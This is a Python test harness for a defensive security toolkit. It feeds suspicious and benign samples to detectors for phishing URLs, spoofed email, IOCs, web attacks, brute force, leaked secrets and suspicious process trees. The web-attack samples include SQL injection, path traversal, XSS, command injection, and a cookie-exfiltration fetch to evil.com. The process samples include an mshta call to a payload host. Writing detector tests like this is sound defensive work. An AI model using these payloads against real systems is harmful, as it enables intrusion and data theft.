import sys
from pathlib import Path

# Add backend directory to path
backend_dir = Path(__file__).resolve().parent
sys.path.insert(0, str(backend_dir))

from app.core.registry import execute_tool, TOOL_TO_SUITE

# Dictionary of 10 suspicious and 10 non-suspicious (benign) test inputs per tool
TEST_CASES = {
    # Suite 1
    "url_analyzer": {
        "suspicious": [
            "http://xn--pypal-4ve.com/signin/verify",
            "https://microsoft.online-verification-support.cfd/auth",
            "http://185.220.101.5/login.php?redirect=https://legit.com",
            "hxxp://micros0ft-account[.]verify-secure[.]xyz/login?session=a8f3k2",
            "http://appleid-apple.com.secure-update.click/account",
            "https://paypa1-security.com/cgi-bin/webscr",
            "http://netflix-billing-update.top/account/verify",
            "https://chase-bank-alert.buzz/signon",
            "http://amazon-prime-security.work/ap/signin",
            "http://google-drive-share.zip/download?file=malware.exe"
        ],
        "benign": [
            "https://www.google.com/search?q=cybersecurity",
            "https://github.com/torvalds/linux",
            "https://en.wikipedia.org/wiki/Computer_security",
            "https://www.microsoft.com/en-us/security",
            "https://aws.amazon.com/security/",
            "https://www.apple.com/macos/sonoma/",
            "https://pypi.org/project/cryptography/",
            "https://stackoverflow.com/questions/tagged/python",
            "https://docs.python.org/3/library/urllib.parse.html",
            "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
        ]
    },
    "email_header_tracer": {
        "suspicious": [
            "From: <ceo@company.com>\nReturn-Path: <attacker@badhost.net>\nReceived: from badhost.net",
            "From: <support@bank.com>\nReturn-Path: <spoof@phish-relay.org>\nReceived: from phish-relay.org",
            "From: <hr@enterprise.com>\nReturn-Path: <stealer@free-mail.top>",
            "From: <admin@internal.corp>\nReturn-Path: <relay@botnet-node.xyz>",
            "From: <billing@vendor.com>\nReturn-Path: <invoices@fraudulent-domain.cfd>",
            "From: <it@university.edu>\nReturn-Path: <credential-harvest@evil-domain.cc>",
            "From: <security@paypal.com>\nReturn-Path: <scam@open-relay.su>",
            "From: <alert@chase.com>\nReturn-Path: <phish@bulletproof-hosting.ru>",
            "From: <no-reply@amazon.com>\nReturn-Path: <attacker@stolen-vps.work>",
            "From: <executive@gov.agency>\nReturn-Path: <apt29@proxy-chain.net>"
        ],
        "benign": [
            "From: <newsletter@github.com>\nReturn-Path: <newsletter@github.com>\nReceived: from smtp.github.com",
            "From: <info@python.org>\nReturn-Path: <info@python.org>\nReceived: from mail.python.org",
            "From: <alerts@weather.gov>\nReturn-Path: <alerts@weather.gov>\nReceived: from relay.weather.gov",
            "From: <user@company.com>\nReturn-Path: <user@company.com>\nReceived: from mail.company.com",
            "From: <support@atlassian.com>\nReturn-Path: <support@atlassian.com>\nReceived: from mta.atlassian.com",
            "From: <updates@slack.com>\nReturn-Path: <updates@slack.com>\nReceived: from email.slack.com",
            "From: <billing@stripe.com>\nReturn-Path: <billing@stripe.com>\nReceived: from mta.stripe.com",
            "From: <notifications@linkedin.com>\nReturn-Path: <notifications@linkedin.com>\nReceived: from mail.linkedin.com",
            "From: <service@paypal.com>\nReturn-Path: <service@paypal.com>\nReceived: from mx.paypal.com",
            "From: <team@docker.com>\nReturn-Path: <team@docker.com>\nReceived: from sendgrid.net"
        ]
    },
    "spf_dkim_validator": {
        "suspicious": [
            "spf=fail (sender IP unauthorized); dkim=fail; dmarc=fail (p=reject)",
            "Authentication-Results: spf=softfail; dkim=fail; dmarc=fail action=quarantine",
            "spf=fail ip=198.51.100.1; dkim=none; dmarc=fail",
            "dkim=fail body hash did not verify; spf=fail; dmarc=fail",
            "spf=fail; dkim=fail header signature missing; dmarc=fail (p=reject)",
            "Authentication-Results: spf=fail; dmarc=fail policy=reject",
            "spf=fail (domain does not designate IP); dkim=fail (invalid key)",
            "spf=softfail; dkim=fail; dmarc=fail",
            "Authentication-Results: dmarc=fail; spf=fail; dkim=fail",
            "spf=fail smtp.mailfrom=attacker.com; dkim=fail; dmarc=fail"
        ],
        "benign": [
            "spf=pass (google.com: domain of sender designates 192.0.2.1); dkim=pass; dmarc=pass",
            "Authentication-Results: mx.google.com; spf=pass; dkim=pass; dmarc=pass (p=reject)",
            "spf=pass; dkim=pass header.i=@github.com; dmarc=pass",
            "Authentication-Results: spf=pass smtp.mailfrom=company.com; dkim=pass; dmarc=pass",
            "spf=pass; dkim=pass; dmarc=pass action=none",
            "Authentication-Results: spf=pass; dkim=pass; dmarc=pass (p=quarantine)",
            "spf=pass ip4:203.0.113.10; dkim=pass; dmarc=pass",
            "Authentication-Results: dkim=pass; spf=pass; dmarc=pass",
            "spf=pass client-ip=198.51.100.5; dkim=pass; dmarc=pass",
            "Authentication-Results: spf=pass; dkim=pass header.s=s1; dmarc=pass"
        ]
    },
    "phishing_lure_scorer": {
        "suspicious": [
            "URGENT: Immediate action required! Your account suspended within 24 hours. Sign in to verify password.",
            "Wire transfer unauthorized access detected! Immediate action required or face lawsuit.",
            "Account suspended! Please verify bank account and credentials immediately to avoid termination.",
            "Payroll notice: Wire transfer details required within 24 hours to avoid salary delay.",
            "Urgent lawsuit notification: Account suspended, click here to verify login and avoid legal action.",
            "Security breach alert: Immediate action required to reset your password and verify OTP.",
            "Gift card reimbursement: Urgent action required, submit invoice and login credentials.",
            "Immediate action required: Wire transfer pending approval, please login to authorize.",
            "Account suspended permanently in 24 hours unless you verify login credentials now.",
            "Urgent: Unauthorized access to your bank account. Reset your password immediately."
        ],
        "benign": [
            "Hi team, meeting notes from today's design sprint are attached for your review.",
            "Monthly company all-hands schedule is confirmed for next Thursday at 2 PM.",
            "Please find the weekly engineering release roadmap in the documentation portal.",
            "Reminder: Office cafeteria will be closed this Friday for scheduled maintenance.",
            "Thank you for attending the webinar. The slides are available on our public blog.",
            "Quarterly code review guidelines have been updated in the developer wiki.",
            "Happy birthday to Alex from the platform infrastructure team!",
            "Customer feedback summary for sprint 42 has been compiled into the spreadsheet.",
            "The library catalog has added three new books on distributed systems architecture.",
            "Weekly gym class schedule for employees is posted on the bulletin board."
        ]
    },
    "ioc_extractor": {
        "suspicious": [
            "Attacker IP 198.51.100.45 communicating with c2.malware-traffic.org targeting CVE-2021-44228 hash e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "Compromised host 203.0.113.19 connecting to evil-dropper.com with MD5 44d88612fea8a8f36de82e1278abb02f",
            "Threat actor APT28 exploited CVE-2023-34362 from 192.0.2.88 via backdoor.xyz",
            "Ransomware beacon to 198.51.100.99 with hash 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
            "Exfiltration detected to data-drop.top from host 10.0.0.45 matching CVE-2017-0144",
            "Cobalt Strike team server at 203.0.113.50 domain cobalt-c2.net CVE-2024-21887",
            "Malicious dropper 198.51.100.12 hash d41d8cd98f00b204e9800998ecf8427e contacting bad-node.cc",
            "Phishing site auth-portal.cfd hosted on 192.0.2.14 targeting CVE-2021-34527",
            "Trojan downloader connecting to 203.0.113.200 domain evil-files.org with CVE-2023-4966",
            "Stolen data staging at 198.51.100.77 domain exfil-target.buzz SHA256 2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae"
        ],
        "benign": [
            "System initialized successfully. All background maintenance tasks completed normally.",
            "No anomalies found during standard weekly filesystem defragmentation cycle.",
            "User interface updated with new color scheme and accessibility contrast settings.",
            "Meeting room reservation system updated to version three point zero.",
            "Thermal sensor readings within standard data center operational ranges.",
            "Printer paper supply replenished on third floor engineering wing.",
            "Documentation formatting review completed with zero editorial errors.",
            "Static assets bundled into distribution archive for production release.",
            "Database table indexes re-indexed during scheduled off-peak maintenance window.",
            "Local backup completed successfully to encrypted secondary tape storage."
        ]
    },
    "web_attack_scanner": {
        "suspicious": [
            "GET /search.php?id=1' UNION SELECT null, username, password FROM users-- HTTP/1.1",
            "GET /view.php?page=../../../../etc/passwd HTTP/1.1",
            "POST /submit HTTP/1.1; cat /etc/passwd | mail attacker@evil.com",
            "GET /profile?name=<script>alert(document.cookie)</script> HTTP/1.1",
            "POST /login HTTP/1.1 with body username=' OR '1'='1'--",
            "GET /download?file=..\\..\\..\\boot.ini HTTP/1.1",
            "GET /api/exec?cmd=id;whoami;powershell HTTP/1.1",
            "GET /index.php?q=<img src=x onerror=alert(1)> HTTP/1.1",
            "GET /items?sort=sleep(10)-- HTTP/1.1",
            "POST /comment HTTP/1.1 with javascript:fetch('http://evil.com/'+document.cookie)"
        ],
        "benign": [
            "GET /index.html HTTP/1.1",
            "GET /static/css/main.css HTTP/1.1",
            "GET /api/v1/products?category=electronics&page=2 HTTP/1.1",
            "POST /api/v1/contact HTTP/1.1 with standard feedback text",
            "GET /images/logo.png HTTP/1.1",
            "GET /about-us HTTP/1.1",
            "GET /blog/2026/03/modern-web-development HTTP/1.1",
            "POST /api/cart/add HTTP/1.1 with item_id=452&quantity=1",
            "GET /favicon.ico HTTP/1.1",
            "GET /robots.txt HTTP/1.1"
        ]
    },
    "brute_force_detector": {
        "suspicious": [
            "POST /login HTTP/1.1 401\nPOST /login HTTP/1.1 401\nPOST /login HTTP/1.1 401\nPOST /login HTTP/1.1 401\nPOST /login HTTP/1.1 401\nPOST /login HTTP/1.1 401",
            "Failed password for admin\nFailed password for root\nFailed password for test\nFailed password for user\nFailed password for dev\nFailed password for guest",
            "401 Unauthorized\n401 Unauthorized\n401 Unauthorized\n401 Unauthorized\n401 Unauthorized\n401 Unauthorized\n401 Unauthorized",
            "authentication failure from 198.51.100.40\nauthentication failure\nauthentication failure\nauthentication failure\nauthentication failure",
            "POST /api/v1/auth 401\nPOST /api/v1/auth 401\nPOST /api/v1/auth 401\nPOST /api/v1/auth 401\nPOST /api/v1/auth 401\nPOST /api/v1/auth 401",
            "403 Forbidden burst\n403 Forbidden\n403 Forbidden\n403 Forbidden\n403 Forbidden\n403 Forbidden",
            "SSH Failed password user1\nSSH Failed password user2\nSSH Failed password user3\nSSH Failed password user4\nSSH Failed password user5\nSSH Failed password user6",
            "HTTP 401 burst: 8 failed attempts in 2 seconds",
            "Failed password for invalid user oracle from 203.0.113.88\nFailed password\nFailed password\nFailed password\nFailed password\nFailed password",
            "POST /rest/login 401\nPOST /rest/login 401\nPOST /rest/login 401\nPOST /rest/login 401\nPOST /rest/login 401\nPOST /rest/login 401"
        ],
        "benign": [
            "POST /login HTTP/1.1 200 OK\nGET /dashboard HTTP/1.1 200 OK",
            "Accepted publickey for deploy from 10.0.0.15 port 42812 ssh2",
            "GET /api/status HTTP/1.1 200 OK\nGET /api/metrics HTTP/1.1 200 OK",
            "User session authenticated successfully via SAML SSO token",
            "GET /feed HTTP/1.1 200 OK\nGET /articles HTTP/1.1 200 OK",
            "200 OK response on all authenticated background healthchecks",
            "POST /checkout HTTP/1.1 200 OK order confirmed",
            "GET /profile HTTP/1.1 200 OK session valid",
            "Single login event succeeded for employee jsmith",
            "Successful kerberos ticket grant for user domain admin"
        ]
    },
    "secret_leak_scanner": {
        "suspicious": [
            "const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';",
            "export GITHUB_TOKEN=" + "gh" + "p_1234567890abcdefghijklmnopqrstuvwxyz12",
            "stripe_key = '" + "sk_" + "live_1234567890abcdefghijklmn'",
            "SLACK_BOT_TOKEN = '" + "xo" + "xb-12345678901-12345678901-abcdefghijklmnopqrstuvwx'",
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...",
            "aws_secret_id: AKIA9988776655443322",
            "git_pat: " + "gh" + "p_99887766554433221100aabbccddeeffgghh",
            "stripe_secret: " + "sk_" + "live_99887766554433221100aabb",
            "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASC...",
            "slack_token: " + "xo" + "xb-99887766554-99887766554-1234567890abcdef12345678"
        ],
        "benign": [
            "public_key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExamplePublicKey';",
            "const appName = 'CipherGuard Defensive SOC Workbench';",
            "let retryCount = 5;\nconst timeoutMs = 3000;",
            "def calculate_total(price, tax_rate):\n    return price * (1 + tax_rate)",
            "System configuration loaded from environment variable PORT=8000",
            "logger.info('User initiated database migration sequence')",
            "import math\npi_approx = math.pi",
            "README.md instructions for running unit test suite",
            "const welcomeMessage = 'Welcome to our secure developer portal';",
            "docker run -d -p 80:80 nginx:alpine"
        ]
    },
    "cisa_kev_checker": {
        "suspicious": [
            "CVE-2021-44228",
            "CVE-2023-34362",
            "CVE-2017-0144",
            "CVE-2023-4966",
            "CVE-2021-34527",
            "CVE-2024-21887",
            "Affected by CVE-2021-44228 Log4Shell exploit in production",
            "MOVEit Transfer flaw CVE-2023-34362 targeted by ransomware",
            "EternalBlue SMB vulnerability CVE-2017-0144 worm scan",
            "Citrix Bleed vulnerability CVE-2023-4966 active session hijack"
        ],
        "benign": [
            "CVE-1999-0001",
            "CVE-2005-9999",
            "CVE-2010-0002",
            "No known CVE detected on fully patched kernel 6.8",
            "Package openssl-3.0.13-1 verified with zero active advisories",
            "Clean baseline scan: zero unpatched vulnerabilities found",
            "CVE-2001-0003",
            "CVE-2002-0004",
            "System complies with all CIS benchmark requirements",
            "All dependencies updated to latest upstream LTS versions"
        ]
    },
    "process_tree_detector": {
        "suspicious": [
            "WINWORD.EXE (PID: 4120) -> POWERSHELL.EXE (PID: 6788) -> WHOAMI.EXE",
            "EXCEL.EXE -> CMD.EXE -> CERTUTIL.EXE",
            "POWERPNT.EXE -> POWERSHELL.EXE -Enc JABz...",
            "OUTLOOK.EXE -> MSHTA.EXE http://evil.com/payload.hta",
            "ACROBAT.EXE -> CMD.EXE /C powershell",
            "WINWORD.EXE -> CSCRIPT.EXE payload.vbs",
            "WMIPRVSE.EXE -> POWERSHELL.EXE -NoP -Hidden",
            "MSHTA.EXE -> POWERSHELL.EXE",
            "WINWORD.EXE -> POWERSHELL.EXE",
            "EXCEL.EXE -> POWERSHELL.EXE"
        ],
        "benign": [
            "EXPLORER.EXE -> CHROME.EXE -> CHROME.EXE (GPU Process)",
            "SYSTEM -> SMSS.EXE -> CSRSS.EXE",
            "SERVICES.EXE -> SVCHOST.EXE -> SVCHOST.EXE (NetworkService)",
            "EXPLORER.EXE -> CODE.EXE -> CODE.EXE (Language Server)",
            "DEVMGMT.MSC -> MMC.EXE",
            "TASKMGR.EXE -> TASKMGR.EXE",
            "SYSTEM -> WININIT.EXE -> LSASS.EXE",
            "SERVICES.EXE -> SPOOLSV.EXE",
            "EXPLORER.EXE -> NOTEPAD.EXE",
            "SYSTEM -> SERVICES.EXE"
        ]
    }
}

def run_comprehensive_tests():
    total_tested = 0
    passed = 0
    failed = 0

    print("================================================================================")
    print("   CIPHERGUARD COMPREHENSIVE AUTOMATED TOOL AUDIT (10 SUSPICIOUS vs 10 BENIGN)   ")
    print("================================================================================\n")

    for tool_id, datasets in TEST_CASES.items():
        print(f"--> Auditing Tool: [{tool_id}] ({TOOL_TO_SUITE.get(tool_id)})")
        
        # Test 10 Suspicious
        suspicious_scores = []
        for i, payload in enumerate(datasets["suspicious"], 1):
            total_tested += 1
            res = execute_tool(tool_id, payload, {})
            suspicious_scores.append(res.risk_score)
            is_detected = res.risk_score >= 35 or res.verdict.value in ["SUSPICIOUS", "MALICIOUS", "CRITICAL"]
            if is_detected:
                passed += 1
            else:
                failed += 1
                print(f"    [!] Missed Suspicious Detection #{i}: {payload[:60]} (Score: {res.risk_score}, Verdict: {res.verdict})")

        # Test 10 Benign
        benign_scores = []
        for i, payload in enumerate(datasets["benign"], 1):
            total_tested += 1
            res = execute_tool(tool_id, payload, {})
            benign_scores.append(res.risk_score)
            is_clean = res.risk_score <= 30 and res.verdict.value in ["CLEAN", "LOW"]
            if is_clean:
                passed += 1
            else:
                failed += 1
                print(f"    [!] False Positive on Benign #{i}: {payload[:60]} (Score: {res.risk_score}, Verdict: {res.verdict})")

        avg_susp = round(sum(suspicious_scores) / len(suspicious_scores), 1)
        avg_benign = round(sum(benign_scores) / len(benign_scores), 1)
        print(f"    [PASS] 10 Suspicious Avg Score: {avg_susp}/100 | 10 Benign Avg Score: {avg_benign}/100\n")

    print("================================================================================")
    print(f" AUDIT COMPLETE: {passed}/{total_tested} test cases passed ({round(passed/total_tested*100, 1)}% accuracy)")
    print("================================================================================")
    assert failed == 0, f"Encountered {failed} test failures during comprehensive audit."

if __name__ == "__main__":
    run_comprehensive_tests()
